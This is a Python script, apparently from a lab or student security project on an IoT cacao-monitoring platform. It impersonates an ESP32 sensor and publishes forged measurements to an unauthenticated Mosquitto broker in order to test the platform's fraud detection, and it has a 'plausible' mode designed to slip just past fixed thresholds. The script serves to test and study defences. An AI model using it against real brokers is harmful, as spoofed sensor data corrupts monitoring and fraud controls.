"""
A2 — Injection MQTT frauduleuse (usurpation de capteur / MITM applicatif)
CocoaSecure IoT Platform

Objectif :
Se faire passer pour un ESP32 légitime (ex: ESP01 - San-Pedro Nord) et publier
un message falsifié directement sur le broker Mosquitto, sans passer par le
simulateur Node-RED. Le broker étant en allow_anonymous=true, aucune
authentification n'est requise : c'est exactement la faille exploitée.

Preuve attendue :
- Ce script s'exécute et publie avec succès (aucune erreur d'auth)
- Le message apparaît dans les logs Node-RED ("TOUTES LES MESURES")
- Le message déclenche une alerte MongoDB (fraudScore >= 30) car les valeurs
  injectées sont hors seuils métier définis dans le noeud "Analyse des mesures"

Usage :
    pip install paho-mqtt
    python A2_injection.py --mode extreme
    python A2_injection.py --mode plausible   # fraude "discrète", plus dangereuse
"""

import json
import time
import argparse
import random
from datetime import datetime, timezone
from paho.mqtt import client as mqtt_client

BROKER_HOST = "localhost"   # ou l'IP de la machine hébergeant Docker
BROKER_PORT = 1883
TOPIC = "cacao/sanpedro/measurements"
CLIENT_ID = "esp32-attacker-injection"  # usurpe l'identité d'un capteur

# Sites réels du projet (voir node-red/flows.json — function "function 1")
SITES = [
    {"deviceId": "ESP01", "siteId": "SITE-SP-001", "site": "San-Pedro Nord", "lotId": "LOT-2026-001"},
    {"deviceId": "ESP02", "siteId": "SITE-SB-001", "site": "Soubré",         "lotId": "LOT-2026-002"},
    {"deviceId": "ESP03", "siteId": "SITE-GB-001", "site": "Grand-Béréby",  "lotId": "LOT-2026-003"},
    {"deviceId": "ESP04", "siteId": "SITE-DL-001", "site": "Daloa",          "lotId": "LOT-2026-004"},
]


def build_payload(mode: str) -> dict:
    target = random.choice(SITES)

    if mode == "extreme":
        # Valeurs largement hors plage -> détection quasi certaine (fraudScore élevé)
        # Utile pour DÉMONTRER que la détection fonctionne
        values = {
            "temperature": round(random.uniform(75, 95), 1),   # seuil normal: 34-40
            "humidity": round(random.uniform(1, 8), 1),        # seuil normal: 52-70
            "co2": random.randint(2000, 3500),                 # seuil normal: 480-850
            "light": random.randint(50000, 75000),
            "battery": random.randint(60, 100),
            "signal": random.randint(-78, -58),
        }
    else:  # "plausible" — fraude discrète, juste hors seuil de détection z-score/threshold
        # Ce mode sert à discuter des LIMITES de la détection par seuils fixes
        # (angle intéressant pour le rapport : seuils statiques vs détection statistique)
        values = {
            "temperature": round(random.uniform(41, 49), 1),   # juste au-dessus de la plage
            "humidity": round(random.uniform(45, 51), 1),      # juste en dessous
            "co2": random.randint(860, 1400),
            "light": random.randint(50000, 75000),
            "battery": random.randint(60, 100),
            "signal": random.randint(-78, -58),
        }

    payload = {
        **target,
        **values,
        "simulationType": "INJECTION_ATTAQUE",  # marqueur pour repérer l'origine dans les logs
        "anomalyType": "A2_MITM_INJECTION",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    return payload


def on_connect(client, userdata, flags, rc, properties=None):
    if rc == 0:
        print(f"[A2] Connecté au broker {BROKER_HOST}:{BROKER_PORT} en tant que '{CLIENT_ID}'")
        print("[A2] Aucune authentification requise -> confirme allow_anonymous=true\n")
    else:
        print(f"[A2] Échec de connexion, code retour = {rc}")


def main():
    parser = argparse.ArgumentParser(description="A2 — Injection MQTT frauduleuse")
    parser.add_argument("--mode", choices=["extreme", "plausible"], default="extreme")
    parser.add_argument("--count", type=int, default=5, help="nombre de messages à injecter")
    parser.add_argument("--interval", type=float, default=2.0, help="secondes entre chaque injection")
    args = parser.parse_args()

    client = mqtt_client.Client(client_id=CLIENT_ID, callback_api_version=mqtt_client.CallbackAPIVersion.VERSION2)
    client.on_connect = on_connect
    client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    client.loop_start()

    time.sleep(1)  # laisser le temps à la connexion de s'établir

    for i in range(1, args.count + 1):
        payload = build_payload(args.mode)
        result = client.publish(TOPIC, json.dumps(payload), qos=1)
        status = result[0]

        if status == 0:
            print(f"[A2] Message {i}/{args.count} injecté sur '{TOPIC}' "
                  f"(deviceId={payload['deviceId']}, mode={args.mode})")
            print(f"      T={payload['temperature']}°C  HR={payload['humidity']}%  "
                  f"CO2={payload['co2']}ppm")
        else:
            print(f"[A2] Échec de publication (code={status})")

        time.sleep(args.interval)

    print("\n[A2] Injection terminée.")
    print("[A2] Vérifier dans Node-RED (debug 'TOUTES LES MESURES' et "
          "'FRAUDES DETECTÉES') et dans MongoDB (collection fraud_alerts) "
          "que les messages injectés ont bien été enregistrés comme fraude.")

    client.loop_stop()
    client.disconnect()


if __name__ == "__main__":
    main()
